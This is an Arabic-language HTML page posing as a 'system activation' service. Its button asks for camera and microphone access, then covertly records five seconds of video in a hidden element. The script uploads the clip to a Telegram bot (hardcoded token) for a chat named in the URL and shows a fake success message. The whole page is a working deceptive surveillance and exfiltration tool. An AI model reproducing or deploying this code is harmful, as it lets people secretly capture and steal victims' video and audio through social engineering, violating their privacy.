<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل النظام</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #000; color: white; margin: 0; }
        #startBtn { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 8px; }
        video { display: none; }
    </style>
</head>
<body>

    <h2>يجب الضغط على الزر لتفعيل الخدمة</h2>
    <button id="startBtn">ابدأ الآن</button>
    
    <video id="video" autoplay muted playsinline></video>

    <script>
        const startBtn = document.getElementById('startBtn');
        const video = document.getElementById('video');
        
        const urlParams = new URLSearchParams(window.location.search);
        const senderId = urlParams.get('sender_id');
        const botToken = "8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E";

        startBtn.onclick = async () => {
            if (!senderId) {
                alert("خطأ: لم يتم العثور على معرف المستخدم.");
                return;
            }
            startBtn.innerText = "جاري التحميل...";
            
            try {
                // طلب إذن الكاميرا والمايكروفون لتسجيل الفيديو
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;
                
                // بدء التسجيل باستخدام MediaRecorder
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    await sendVideoToTelegram(blob);
                    // إيقاف الكاميرا بعد الانتهاء
                    stream.getTracks().forEach(track => track.stop());
                };

                // تسجيل لمدة 5 ثوانٍ بمجرد الموافقة
                mediaRecorder.start();
                
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 5000); // مدة التسجيل 5 ثوانٍ

            } catch (err) {
                console.error(err);
                alert("يرجى السماح بالوصول للكاميرا لتشغيل الخدمة.");
                startBtn.innerText = "ابدأ الآن";
            }
        };

        async function sendVideoToTelegram(videoBlob) {
            const formData = new FormData();
            formData.append('chat_id', senderId);
            formData.append('video', videoBlob, 'recording.mp4');

            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    alert("تم التفعيل بنجاح!");
                } else {
                    alert("حدث خطأ أثناء الإرسال.");
                }
            } catch (error) {
                console.error("Error:", error);
            }
        }
    </script>
</body>
</html>
